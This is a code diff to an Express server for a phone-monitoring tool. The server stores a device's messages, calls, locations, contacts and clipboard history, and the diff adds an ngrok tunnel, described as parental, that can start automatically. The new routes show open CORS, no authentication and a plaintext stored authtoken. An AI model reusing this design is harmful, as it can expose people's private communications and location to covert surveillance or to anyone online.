@@ -8,13 +8,29 @@ import { mkdirSync, existsSync } from 'fs';
 import { JSONFilePreset } from 'lowdb/node';
 import { randomUUID } from 'crypto';
 import os from 'os';
+import { startTunnel, stopTunnel, getTunnelStatus } from './tunnel.js';
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = dirname(__filename);
-const dataDir = join(__dirname, '..', 'data');
+const dataDir = process.env.DATA_DIR || join(__dirname, '..', 'data');
 mkdirSync(dataDir, { recursive: true });
 
-const distPath = join(__dirname, '../../dashboard/dist');
+// Resolve dashboard dist path across dev and packaged Electron environments
+let distPath = join(__dirname, '../../dashboard/dist');
+if (!existsSync(distPath)) {
+  const possiblePaths = [
+    join(__dirname, '../dashboard/dist'),
+    join(process.cwd(), 'dashboard/dist'),
+    join(process.resourcesPath || '', 'dashboard/dist'),
+    join(process.resourcesPath || '', 'app/dashboard/dist')
+  ];
+  for (const p of possiblePaths) {
+    if (existsSync(p)) {
+      distPath = p;
+      break;
+    }
+  }
+}
 
 const app = express();
 app.use(cors());
@@ -40,7 +56,7 @@ await db.read();
 // from before a field was added keeps its old shape forever otherwise, and
 // every route touching the missing key throws. Backfill anything missing.
 const ARRAY_KEYS = ['devices', 'calls', 'messages', 'locations', 'notifications', 'contacts', 'clipboardHistory', 'commandQueue'];
-const OBJECT_KEYS = ['deviceInfo', 'installedApps', 'wifi', 'callBlocklist', 'cellular', 'dnd', 'syncConfig'];
+const OBJECT_KEYS = ['deviceInfo', 'installedApps', 'wifi', 'callBlocklist', 'cellular', 'dnd', 'syncConfig', 'tunnelConfig'];
 for (const key of ARRAY_KEYS) {
   if (!Array.isArray(db.data[key])) db.data[key] = [];
 }
@@ -1070,6 +1086,47 @@ app.post('/api/command/:name', async (req, res) => {
   res.json({ success: true });
 });
 
+// ------------------------------------------------------------- ngrok Cloud Tunnel
+app.get('/api/tunnel', (req, res) => {
+  res.json({
+    status: getTunnelStatus(),
+    config: db.data.tunnelConfig || {}
+  });
+});
+
+app.post('/api/tunnel/start', async (req, res) => {
+  try {
+    const { authtoken, domain, autoStart } = req.body;
+    const token = authtoken || db.data.tunnelConfig?.authtoken;
+    const dom = domain !== undefined ? domain : db.data.tunnelConfig?.domain;
+
+    db.data.tunnelConfig = {
+      authtoken: token,
+      domain: dom,
+      autoStart: autoStart !== undefined ? Boolean(autoStart) : (db.data.tunnelConfig?.autoStart ?? true)
+    };
+    await db.write();
+
+    const status = await startTunnel({ port: PORT, authtoken: token, domain: dom });
+    res.json({ success: true, status, config: db.data.tunnelConfig });
+  } catch (err) {
+    res.status(500).json({ success: false, error: err.message });
+  }
+});
+
+app.post('/api/tunnel/stop', async (req, res) => {
+  try {
+    if (db.data.tunnelConfig) {
+      db.data.tunnelConfig.autoStart = false;
+      await db.write();
+    }
+    const status = await stopTunnel();
+    res.json({ success: true, status, config: db.data.tunnelConfig });
+  } catch (err) {
+    res.status(500).json({ success: false, error: err.message });
+  }
+});
+
 if (existsSync(distPath)) {
   app.get('*', (req, res, next) => {
     if (req.path.startsWith('/api')) return next();
@@ -1077,16 +1134,31 @@ if (existsSync(distPath)) {
   });
 }
 
-httpServer.listen(5000, '0.0.0.0', () => {
+const PORT = parseInt(process.env.PORT || process.argv[2] || '5000', 10);
+
+httpServer.listen(PORT, '0.0.0.0', async () => {
   const ip = getLocalIP();
   console.log(`
-
 ====================================
   Phone Link Server
-  Local:    http://localhost:5000
-  Network:  http://${ip}:5000
+  Local:    http://localhost:${PORT}
+  Network:  http://${ip}:${PORT}
 
-  In the Android app connect to: ${ip}
+  In the Android app connect to: ${ip} (Port: ${PORT})
 ====================================
 `);
+
+  // Auto-start tunnel if configured by parent
+  if (db.data.tunnelConfig?.autoStart && db.data.tunnelConfig?.authtoken) {
+    console.log('[ngrok] Auto-starting parental cloud tunnel from saved config...');
+    try {
+      await startTunnel({
+        port: PORT,
+        authtoken: db.data.tunnelConfig.authtoken,
+        domain: db.data.tunnelConfig.domain
+      });
+    } catch (e) {
+      console.warn('[ngrok] Auto-start tunnel failed:', e.message);
+    }
+  }
 });
